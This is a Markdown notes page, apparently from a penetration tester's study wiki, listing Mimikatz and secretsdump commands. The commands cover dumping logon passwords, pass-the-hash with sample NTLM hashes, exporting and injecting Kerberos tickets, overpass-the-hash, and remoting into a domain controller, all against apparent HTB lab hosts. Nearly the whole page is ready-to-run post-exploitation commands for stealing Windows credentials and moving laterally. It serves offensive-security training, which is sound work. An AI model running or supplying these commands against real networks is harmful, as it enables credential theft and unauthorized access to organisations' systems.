---
tags:
  - Post-Exploitation
  - OperatingSystems
  - Windows
  - Tooling
---

[Home · gentilkiwi/mimikatz Wiki · GitHub](https://github.com/gentilkiwi/mimikatz/wiki)
## Guide

1. [Mimikatz – Active Directory Security](https://adsecurity.org/?page_id=1821)
2. [Mimikatz | HackTricks | HackTricks](https://book.hacktricks.xyz/windows-hardening/stealing-credentials/credentials-mimikatz)

For Linux systems see a Python implementation: [pypykatz](https://github.com/skelsec/pypykatz)
## Walkthrough 

1. See [[System Monitor (Sysmon)#Detection Example 3 Detecting Credential Dumping]]

## Usage 

```cmd-session
mimikatz.exe
```
### Secrets Dump

```
secretsdump.py svc-alfresco:s3rvice@10.10.10.161
```

### Dump Passwords

```cmd
privilege::debug
sekurlsa::logonpasswords
```
### Pass the Hash

Mimikatz has a module named `sekurlsa::pth` that allows us to perform a Pass the Hash attack by starting a process using the hash of the user's password. To use this module, we will need the following:

- `/user` - The user name we want to impersonate.
- `/rc4` or `/NTLM` - NTLM hash of the user's password.
- `/domain` - Domain the user to impersonate belongs to. In the case of a local user account, we can use the computer name, localhost, or a dot (.).
- `/run` - The program we want to run with the user's context (if not specified, it will launch cmd.exe).

```cmd-session
 mimikatz.exe privilege::debug "sekurlsa::pth /user:julio /rc4:64F12CDDAA88057E06A81B54E73B949B /domain:inlanefreight.htb /run:cmd.exe" exit
```

### Export Tickets

See [[Pass the Ticket (PtT) Windows]]

```cmd-session
mimikatz.exe
```

```cmd-session
privilege::debug
```

```cmd-session
sekurlsa::tickets /export
```

> [!NOTE]
> At the time of writing, using Mimikatz version 2.2.0 20220919, if we run `sekurlsa::ekeys` it presents all hashes as des_cbc_md4 on some Windows 10 versions. Exported tickets `sekurlsa::tickets /export` do not work correctly due to the wrong encryption. It is possible to use these hashes to generate new tickets or use [[Rubeus]] to export tickets in base64 format.


##### Extract Kerberos Keys

```cmd-session
privilege::debug
```

```cmd-session
sekurlsa::ekeys
```

##### Pass the Key or OverPass the Hash

```cmd-session
privilege::debug
```

```cmd-session
sekurlsa::pth /domain:inlanefreight.htb /user:plaintext /ntlm:3f74aa8f08f712f09cd5177b5c1ce50f
```

This will create a new `cmd.exe` window that we can use to request access to any service we want in the context of the target user.

### Pass the Ticket

```cmd-session
privilege::debug
```

```cmd-session
kerberos::ptt "C:\Users\plaintext\Desktop\Mimikatz\[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi"
```


### Pass The Ticket with PowerShell Remoting

```cmd-session
privilege::debug
```

```cmd-session
kerberos::ptt "C:\Users\Administrator.WIN01\Desktop\[0;1812a]-2-0-40e10000-john@krbtgt-INLANEFREIGHT.HTB.kirbi"
```

```
exit
```

```cmd-session
powershell
```

```cmd-session
Enter-PSSession -ComputerName DC01
```